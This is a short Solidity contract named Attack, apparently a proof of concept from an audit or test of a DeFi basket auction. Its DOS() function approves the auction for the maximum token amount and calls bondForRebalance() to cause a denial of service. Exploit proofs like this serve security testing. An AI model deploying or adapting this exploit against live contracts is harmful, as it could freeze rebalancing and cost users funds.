pragma solidity ^0.8.7;
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "./interfaces/IAttack.sol";

contract Attack{
    IAttack public auction;
    address public basket;
    using SafeERC20 for IERC20;



    constructor(IAttack _auction, address _basket){
        auction = _auction;
        basket = _basket;

    }

    //denial of service
    function DOS() public{
        IERC20(basket).safeApprove(address(auction), type(uint256).max);
        auction.bondForRebalance();
    }
}